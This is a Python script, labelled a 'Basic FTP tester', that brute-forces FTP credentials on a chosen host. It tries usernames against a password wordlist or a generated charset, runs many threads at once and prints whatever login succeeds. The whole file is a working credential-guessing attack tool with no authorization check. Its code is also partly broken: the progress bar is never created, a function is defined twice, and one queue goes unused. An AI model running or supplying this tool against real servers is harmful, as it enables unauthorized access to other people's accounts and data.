import ftplib
import argparse
import threading
from  queue import Queue, Empty
from itertools import product
from tqdm import tqdm




parser = argparse.ArgumentParser(description="Basic FTP tester")


parser.add_argument("-ho","--host",required=True, type=str, help="Enter the target to test ftp")
parser.add_argument("-p","--passfile",type=str,help="Enter the path of file containing password list")
parser.add_argument("-t","--threads",default=20,type=int,help="enter the number of threads. Default : 20")
parser.add_argument("-u","--user",type=str,help="enter the Username to connect to provided host")
parser.add_argument("-U","--userfile",type=str,help="enter the Username to connect to provided host")
parser.add_argument("-g","--genpass", action="store_true", help="Enable password generation mode")
parser.add_argument("--min", type=int, default=4, help="Minimum password length")
parser.add_argument("--max", type=int, default=8, help="Maximum password length")
parser.add_argument("--charset", type=str, default="abc123", help="Characters to use for password generation")


args = parser.parse_args()



host = args.host
user = args.user
passfile = args.passfile
userfile = args.userfile
threads = args.threads if args.threads else 20

combo_queue = Queue()

progress = None
progress_lock = threading.Lock()



if not args.user and not args.userfile:
    parser.error("You must provide either -u (single username) or -U (username file)")

if args.user and args.userfile:
    parser.error("You can only use one of -u (single) or -U (list), not both")






def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for pwd_tuple in product(charset, repeat=length):
            yield ''.join(pwd_tuple)




def passwd(passfile):
    with open(passfile , 'r', encoding='utf-8') as f:
        return[line.strip('\n') for line in f]


#passwords = passwd(passfile)





def load_usernames(userfile):
    with open(userfile, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f]



if args.user:
    usernames = [args.user]
else:
  
    usernames = load_usernames(userfile)


# Determine how to fill the pass_queue
if args.genpass:
    def generate_passwords(charset, min_len, max_len):
        from itertools import product
        for length in range(min_len, max_len + 1):
            for pwd_tuple in product(charset, repeat=length):
                yield ''.join(pwd_tuple)

    passwords = generate_passwords(args.charset, args.min, args.max)
else:
    passwords = passwd(passfile)


for user in usernames:
    if args.genpass:
        pwd_iter = generate_passwords(args.charset, args.min, args.max)
    else:
        pwd_iter = passwd(passfile)

    for pwd in pwd_iter:
        combo_queue.put((user, pwd))



'''
passwords = list(passwords)

for user in usernames:
    for pwd in passwords:
        combo_queue.put((user, pwd))'''

pass_queue = Queue()











event_done = threading.Event()

trueuser = None
truepasswd = None



def workers():
    global trueuser, truepasswd
    while not event_done.is_set():
        try:
            user, password = combo_queue.get_nowait()
        except Empty:
            break

        if event_done.is_set():
            break

        try:
            with ftplib.FTP() as serve:
                serve.connect(host,21,timeout=5)
                serve.login(user,password)

                print("\n===========================================================================\n")
                print(" The Password was Found and Connection was Success\n")
                print(f"Connect with {host} as {user}  :   {password}\n")
                trueuser = user
                truepasswd = password
                event_done.set()
                break

        except Exception:
            pass  # silent fail or optional print

        # ✅ Update progress bar
        with progress_lock:
            progress.update(1)




'''def workers():
    global trueuser, truepasswd
    while not event_done.is_set() and not combo_queue.empty():
        try:
           user, password = combo_queue.get_nowait()
        except Empty:
            break

        if event_done.is_set():  # <- extra check to stop early
            break

        try:
            with ftplib.FTP() as serve:
                serve.connect(host,21,timeout=5)
                serve.login(user,password)
                
                print("===========================================================================\n")
                print(" The Password was Found and Connection was Success\n")
                print(f"Connect with {host} as {user}  :   {password}\n")
                trueuser = user
                truepasswd = password
                event_done.set()
                break
        
        except Exception as e:
            print(f"Connection failed with {user}  :   {password}")
'''





thread_list = []
for _ in range(threads):
    t= threading.Thread(target=workers)
    t.start()
    thread_list.append(t)
    




for t in thread_list:
    t.join()

progress.close()

print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
print("===========================================================================\n")
if trueuser and truepasswd:
    print(f"\n[+] Found credentials: {trueuser}   :   {truepasswd}\n")
else:
    print("\n[-] No valid credentials found.")